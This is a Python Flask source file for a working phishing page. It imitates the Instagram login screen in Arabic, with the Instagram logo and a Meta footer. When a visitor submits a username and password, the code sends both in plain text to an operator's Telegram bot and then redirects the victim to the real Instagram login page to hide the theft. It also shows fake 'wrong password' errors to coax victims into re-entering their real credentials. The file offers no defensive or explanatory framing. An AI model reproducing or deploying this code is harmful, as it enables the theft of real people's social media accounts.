import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"

    if not re.match(username_pattern, username_val):
      error = (
          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
          " اسم المستخدم ومحاولة مرة أخرى."
      )
    elif len(password) <= 5:
      error = (
          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
      )
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(INSTAGRAM_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #121212; 
            color: #f5f5f5;
            height: 100dvh;
            display: flex; 
            flex-direction: column;
            align-items: center; 
            overflow: hidden;
            padding: 15px 20px 20px 20px;
        }
        
        .page-wrapper {
            width: 100%;
            max-width: 350px;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
        }

        /* القسم الأول: كلمة العربية */
        .lang-area {
            width: 100%;
            text-align: center;
            color: #a8a8a8;
            font-size: 12px;
            padding-top: 5px;
        }

        /* القسم الثاني: الشعار (نازل للأسفل بمسافة مريحة ومستقلة) */
        .logo-area {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: 25px; 
        }
        
        .insta-icon {
            width: 46px;
            height: 46px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .insta-icon svg {
            width: 25px;
            height: 25px;
            fill: white;
        }

        /* القسم الثالث: الحقول وزر تسجيل الدخول في المنتصف */
        .form-area { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            text-align: center; 
            flex-grow: 1;
            justify-content: center;
        }

        .error-msg { 
            color: #ed4956; 
            font-size: 12px; 
            line-height: 16px; 
            margin-bottom: 8px; 
            text-align: center; 
            background: #1c1c1c; 
            padding: 8px; 
            border-radius: 8px; 
            border: 1px solid #331a1a; 
            width: 100%;
        }

        form {
            width: 100%;
        }

        .input-group { margin-bottom: 6px; width: 100%; }
        
        .input-group input { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #262626; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            color: #f5f5f5; 
            outline: none; 
        }
        .input-group input:focus { border-color: #a8a8a8; }
        .input-group input::placeholder { color: #8e8e8e; }

        .submit-btn { 
            width: 100%; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 4px; 
            margin-bottom: 10px; 
        }
        .submit-btn:hover { background: #1877f2; }

        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }

        /* القسم الرابع: إنشاء حساب و Meta في الأسفل */
        .footer-area { 
            width: 100%; 
            text-align: center; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        
        .signup-card { 
            padding: 12px; 
            width: 100%; 
            border: 1px solid #262626; 
            border-radius: 8px; 
            text-align: center; 
            font-size: 14px; 
            color: #0095f6; 
            font-weight: 600; 
            cursor: pointer; 
            margin-bottom: 10px;
        }

        .meta-footer { display: flex; align-items: center; justify-content: center; }
        .meta-brand {
            font-size: 13px;
            font-weight: 600;
            color: #737373;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <!-- القسم الأول: كلمة العربية -->
        <div class="lang-area">
            العربية
        </div>

        <!-- القسم الثاني: الشعار -->
        <div class="logo-area">
            <div class="insta-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                </svg>
            </div>
        </div>

        <!-- القسم الثالث: الحقول وزر تسجيل الدخول في المنتصف -->
        <div class="form-area">
            {% if error %}
                <div class="error-msg">{{ error }}</div>
            {% endif %}

            <form method="POST">
                <div class="input-group">
                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
                </div>
                <div class="input-group">
                    <input type="password" name="password" required placeholder="كلمة السر">
                </div>
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>

            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
        </div>

        <!-- القسم الرابع: إنشاء حساب و Meta -->
        <div class="footer-area">
            <div class="signup-card">
                إنشاء حساب جديد
            </div>
            <div class="meta-footer">
                <div class="meta-brand">Meta ∞</div>
            </div>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
